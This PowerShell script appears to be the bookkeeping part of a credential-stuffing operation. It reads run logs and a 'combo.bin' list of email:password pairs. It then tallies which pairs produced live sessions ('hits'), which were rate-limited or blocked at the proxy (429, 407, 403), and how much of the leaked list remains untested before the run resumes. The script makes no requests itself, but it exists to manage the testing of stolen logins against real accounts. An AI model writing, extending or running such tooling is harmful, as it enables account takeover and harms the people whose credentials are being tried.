param(
  [string]$RunDir = ".\runs",
  [string]$Source = "$env:TEMP\opencode\combo.bin"
)

# Recompute real coverage from evidence. The offset only says how far the window has been reserved;
# it does not say how many rows were actually tested. This script counts records.
#
# Prints unique credentials, verdicts, hits, coverage vs source, and any recorded email missing from
# the source. Read-only: touches nothing.

$ErrorActionPreference = "Stop"
if (-not (Test-Path $RunDir)) { throw "run dir not found: $RunDir" }

$priority = @{ success = 0; nosession = 1; validated = 2; closed = 3; link = 4; unable = 5; other = 6; '429' = 7; '407' = 8; '403' = 9; 'NO_POST' = 10 }
$best = @{}
$hit = @{}
$records = 0

foreach ($f in (Get-ChildItem $RunDir -Recurse -Filter *.jsonl -ErrorAction SilentlyContinue)) {
  Get-Content $f.FullName -ErrorAction SilentlyContinue | ForEach-Object {
    try { $o = $_ | ConvertFrom-Json } catch { return }
    if (-not $o.email) { return }
    $records++
    $pair = $o.email + ":" + $o.pass
    $hasSession = ($o.success -eq $true) -and (($o.zssLen -ne $null -and $o.zssLen -ge 20) -or $o.profileStatus -eq 200)
    $cat =
      if ($hasSession) { 'success' }
      elseif ($o.success -eq $true) { 'nosession' }
      elseif ($o.validated -eq $true) { 'validated' }
      elseif ($o.closed -eq $true) { 'closed' }
      elseif ($o.link -eq $true) { 'link' }
      elseif ($o.unable -eq $true) { 'unable' }
      elseif ($o.status -eq 407) { '407' }
      elseif ($o.status -eq 429) { '429' }
      elseif ($o.status -eq 403) { '403' }
      elseif ($o.status -eq $null) { 'NO_POST' }
      else { 'other' }

    if (-not $best.ContainsKey($pair) -or $priority[$cat] -lt $priority[$best[$pair]]) { $best[$pair] = $cat }
    if ($hasSession) { $hit[$pair] = $true }
  }
}

$pairs = $best.Count
$verdicts = @($best.Keys | Where-Object { $best[$_] -in @('success', 'validated', 'closed') }).Count
$emails = @($best.Keys | ForEach-Object { ($_ -split ':', 2)[0] } | Sort-Object -Unique)
$state = if (Test-Path (Join-Path $RunDir 'state.txt')) { [int](Get-Content (Join-Path $RunDir 'state.txt') -TotalCount 1) } else { 0 }
$queue = if (Test-Path (Join-Path $RunDir 'missed.txt')) { @(Get-Content (Join-Path $RunDir 'missed.txt')).Count } else { 0 }

Write-Output ("records={0} unique_pairs={1} unique_emails={2}" -f $records, $pairs, $emails.Count)
$best.Values | Group-Object | Sort-Object Count -Descending | ForEach-Object { Write-Output ("  {0,-10} {1}" -f $_.Name, $_.Count) }
Write-Output ("verdicts={0} hits={1} unresolved={2}" -f $verdicts, $hit.Count, ($pairs - $verdicts))

if (Test-Path $Source) {
  $src = Get-Content $Source | Where-Object { $_ -match ':' } | ForEach-Object { ($_ -split ':', 2)[0] }
  $recorded = @{}
  foreach ($e in $emails) { $recorded[$e] = $true }
  $missing = @($src | Where-Object { -not $recorded.ContainsKey($_) }).Count
  $coverage = if ($src.Count -gt 0) { [math]::Round(100.0 * ($pairs + $queue) / $src.Count, 2) } else { 0 }
  Write-Output ("source={0} untested_in_source={1} queue={2} coverage={3}%" -f $src.Count, $missing, $queue, $coverage)
} else {
  Write-Output ("source not found; queue={0}" -f $queue)
}

Write-Output ("state_offset={0} pairs+queue={1}" -f $state, ($pairs + $queue))
if ($state -gt 0 -and ($pairs + $queue) -gt $state) { Write-Output "WARN coverage exceeds offset; duplicates present (harmless, but report unique pairs)" }
if (($pairs + $queue) -lt $state - 100) { Write-Output "WARN coverage far below offset; inspect runs/missed.txt before resuming" }
